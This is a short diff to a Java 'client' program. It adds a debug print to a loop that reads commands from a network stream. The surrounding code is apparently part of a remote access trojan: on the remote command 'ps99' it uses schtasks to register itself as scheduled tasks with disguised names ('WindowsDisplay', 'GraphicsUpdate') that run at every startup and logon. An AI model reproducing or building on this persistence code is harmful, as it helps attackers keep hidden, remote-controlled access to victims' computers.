@@ -28,6 +28,9 @@ public class client {
                 //System.out.println(loc);
                 while(true) {
                     String line = din.readLine();
+                    
+                    System.out.println("[DEBUG] data received: " + line);
+                    
                     if (line.equals("ps99")) {
                         Process proc1 = Runtime.getRuntime().exec("cmd /c schtasks.exe /create /tn WindowsDisplay /tr "+ loc + " /sc ONSTART ");
                         Process proc2 = Runtime.getRuntime().exec("cmd /c schtasks.exe /create /tn GraphicsUpdate /tr " + loc + " /sc ONLOGON "); 
